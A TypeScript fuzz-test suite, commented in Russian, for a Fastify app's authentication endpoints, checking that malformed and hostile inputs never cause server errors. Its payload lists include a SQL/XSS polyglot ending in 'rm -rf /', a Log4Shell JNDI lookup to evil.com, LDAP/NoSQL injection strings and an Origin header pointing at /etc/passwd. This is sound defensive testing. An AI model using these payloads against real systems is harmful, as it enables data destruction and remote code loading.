/**
 * AUTH FUZZING TESTS
 * Цель: Отправлять РАНДОМНЫЕ, НЕВАЛИДНЫЕ, ВРЕДОНОСНЫЕ данные
 * и убедиться что система НЕ падает
 *
 * Fuzzing - техника тестирования когда мы отправляем случайные/неожиданные данные
 * чтобы найти уязвимости и крэши
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from "vitest";
import { FastifyInstance } from "fastify";
import { buildApp } from "../helpers/app.helper.js";
import { clearDatabase, closeDatabase } from "../helpers/db.helper.js";

describe("Auth Fuzzing Tests", () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    app = await buildApp();
    await app.ready();
  });

  beforeEach(async () => {
    await clearDatabase();
  });

  afterAll(async () => {
    await app.close();
    await closeDatabase();
  });

  describe("Registration Fuzzing", () => {
    it("should handle random binary data", async () => {
      const binaryData = Buffer.from([0x00, 0x01, 0xff, 0xfe, 0x7f]);

      const response = await app.inject({
        method: "POST",
        url: "/api/auth/register",
        payload: binaryData,
      });

      // Не должно быть 500 error
      expect(response.statusCode).not.toBe(500);
      expect([400, 415]).toContain(response.statusCode);
    });

    it("should handle extremely long strings (buffer overflow attempt)", async () => {
      const attacks = [
        "A".repeat(10000),
        "A".repeat(100000),
        "A".repeat(1000000),
      ];

      for (const attack of attacks) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          payload: {
            username: attack,
            email: `${attack}@example.com`,
            password: attack,
            public_key: attack,
          },
        });

        // Должно быстро отклонить без падения
        expect(response.statusCode).not.toBe(500);
        expect([400, 413]).toContain(response.statusCode);
      }
    });

    it("should handle Unicode edge cases", async () => {
      const unicodeAttacks = [
        "\u0000", // NULL byte
        "\uFFFF", // Invalid character
        "🔥💀☠️👹👺", // Emojis
        "你好世界", // Chinese
        "مرحبا", // Arabic
        "𝕳𝖊𝖑𝖑𝖔", // Mathematical alphanumeric
        "\u202E", // Right-to-left override
        "test\r\ninjection", // CRLF
        String.fromCharCode(0x200b), // Zero-width space
      ];

      for (const unicode of unicodeAttacks) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          payload: {
            username: unicode,
            email: "test@example.com",
            password: "password123",
            public_key: "testkey",
          },
        });

        expect(response.statusCode).not.toBe(500);
      }
    });

    it("should handle malformed JSON", async () => {
      const malformedJSON = [
        "{invalid json",
        '{"username": "test"',
        '{"username": }',
        "{{{{{",
        "null",
        "undefined",
        "[]",
        '""',
        "true",
        "123",
      ];

      for (const json of malformedJSON) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          payload: json,
          headers: {
            "Content-Type": "application/json",
          },
        });

        expect(response.statusCode).not.toBe(500);
        expect([400]).toContain(response.statusCode);
      }
    });

    it("should handle circular JSON references", async () => {
      // Создаём circular reference (невозможно сериализовать)
      const circularPayload = { a: 1 };
      // @ts-ignore
      circularPayload.self = circularPayload;

      let payloadStr;
      try {
        payloadStr = JSON.stringify(circularPayload);
      } catch {
        // Ожидаем что это сфейлится
        payloadStr = '{"a": 1}';
      }

      const response = await app.inject({
        method: "POST",
        url: "/api/auth/register",
        payload: payloadStr,
      });

      expect(response.statusCode).not.toBe(500);
    });

    it("should handle deeply nested JSON (DoS attempt)", async () => {
      let nested: any = { a: 1 };
      for (let i = 0; i < 1000; i++) {
        nested = { nested };
      }

      const response = await app.inject({
        method: "POST",
        url: "/api/auth/register",
        payload: nested,
      });

      expect(response.statusCode).not.toBe(500);
    });

    it("should handle special JavaScript values", async () => {
      const specialValues = [
        { username: NaN },
        { username: Infinity },
        { username: -Infinity },
        { username: undefined },
        { username: null },
        { username: [] },
        { username: {} },
      ];

      for (const payload of specialValues) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          payload: JSON.stringify(payload),
        });

        expect(response.statusCode).not.toBe(500);
      }
    });

    it("should handle polyglot payloads (multi-language injection)", async () => {
      const polyglots = [
        // SQL + XSS + Command injection combo
        "'; DROP TABLE users; <script>alert(1)</script> && rm -rf /",
        // LDAP + NoSQL combo
        "*)(uid=*))(|(uid=*' OR '1'='1",
        // XML + JSON combo
        '<?xml version="1.0"?><user>test</user>{"username":"test"}',
      ];

      for (const polyglot of polyglots) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          payload: {
            username: polyglot,
            email: "test@example.com",
            password: polyglot,
            public_key: polyglot,
          },
        });

        expect(response.statusCode).not.toBe(500);
        expect([400, 409]).toContain(response.statusCode);
      }
    });

    it("should handle format string attacks", async () => {
      const formatStrings = [
        "%s%s%s%s%s",
        "%n%n%n%n%n",
        "%x%x%x%x%x",
        "${jndi:ldap://evil.com/a}", // Log4Shell
        "%0A%0D",
      ];

      for (const fmt of formatStrings) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          payload: {
            username: fmt,
            email: "test@example.com",
            password: "password123",
            public_key: "testkey",
          },
        });

        expect(response.statusCode).not.toBe(500);
      }
    });

    it("should handle negative numbers and large integers", async () => {
      const numbers = [
        -1,
        -9999999,
        Number.MAX_SAFE_INTEGER,
        Number.MIN_SAFE_INTEGER,
        999999999999999,
        -999999999999999,
      ];

      for (const num of numbers) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          payload: {
            username: num.toString(),
            email: "test@example.com",
            password: num.toString(),
            public_key: num.toString(),
          },
        });

        expect(response.statusCode).not.toBe(500);
      }
    });
  });

  describe("Login Fuzzing", () => {
    it("should handle random credentials safely", async () => {
      for (let i = 0; i < 50; i++) {
        const randomUsername = Math.random().toString(36).repeat(10);
        const randomPassword = Math.random().toString(36).repeat(10);

        const response = await app.inject({
          method: "POST",
          url: "/api/auth/login",
          payload: {
            username: randomUsername,
            password: randomPassword,
          },
        });

        // Не должно быть 500
        expect(response.statusCode).not.toBe(500);
        expect([401, 400]).toContain(response.statusCode);
      }
    });

    it("should handle control characters in credentials", async () => {
      const controlChars = [
        "\x00",
        "\x01",
        "\x02",
        "\x03",
        "\x04",
        "\x05",
        "\x08",
        "\x09",
        "\x0A",
        "\x0B",
        "\x0C",
        "\x0D",
        "\x1B",
        "\x7F",
      ];

      for (const char of controlChars) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/login",
          payload: {
            username: `user${char}name`,
            password: `pass${char}word`,
          },
        });

        expect(response.statusCode).not.toBe(500);
      }
    });

    it("should handle very long credentials (memory exhaustion attempt)", async () => {
      const response = await app.inject({
        method: "POST",
        url: "/api/auth/login",
        payload: {
          username: "A".repeat(1000000),
          password: "B".repeat(1000000),
        },
      });

      // Должно быстро отклонить
      expect(response.statusCode).not.toBe(500);
      expect([400, 413]).toContain(response.statusCode);
    });
  });

  describe("JWT Fuzzing", () => {
    it("should handle malformed JWT tokens", async () => {
      const malformedTokens = [
        "not.a.jwt",
        "eyJhbGc.invalid",
        "",
        "null",
        "undefined",
        "Bearer ",
        "Bearer null",
        "Bearer undefined",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
        "xxx.yyy.zzz",
      ];

      for (const token of malformedTokens) {
        const response = await app.inject({
          method: "GET",
          url: "/api/me",
          headers: {
            authorization: `Bearer ${token}`,
          },
        });

        // Не должно быть 500
        expect(response.statusCode).not.toBe(500);
        expect([401, 400]).toContain(response.statusCode);
      }
    });

    it("should handle extremely long JWT tokens", async () => {
      const longToken =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." +
        "A".repeat(100000) +
        ".signature";

      const response = await app.inject({
        method: "GET",
        url: "/api/me",
        headers: {
          authorization: `Bearer ${longToken}`,
        },
      });

      expect(response.statusCode).not.toBe(500);
    });
  });

  describe("HTTP Header Fuzzing", () => {
    it("should handle malformed headers", async () => {
      const malformedHeaders = {
        "X-Forwarded-For": "999.999.999.999",
        "User-Agent": "\x00\x01\x02",
        "Accept-Language": "A".repeat(10000),
        Referer: "javascript:alert(1)",
        Origin: "file:///etc/passwd",
      };

      const response = await app.inject({
        method: "POST",
        url: "/api/auth/register",
        headers: malformedHeaders,
        payload: {
          username: "test",
          email: "test@example.com",
          password: "password123",
          public_key: "testkey",
        },
      });

      // Не должно падать
      expect(response.statusCode).not.toBe(500);
    });
  });

  describe("Content-Type Fuzzing", () => {
    it("should handle various Content-Types safely", async () => {
      const contentTypes = [
        "application/xml",
        "text/plain",
        "multipart/form-data",
        "application/x-www-form-urlencoded",
        "image/png",
        "invalid/type",
        "",
      ];

      for (const ct of contentTypes) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          headers: {
            "Content-Type": ct,
          },
          payload: "random data",
        });

        expect(response.statusCode).not.toBe(500);
      }
    });
  });
});
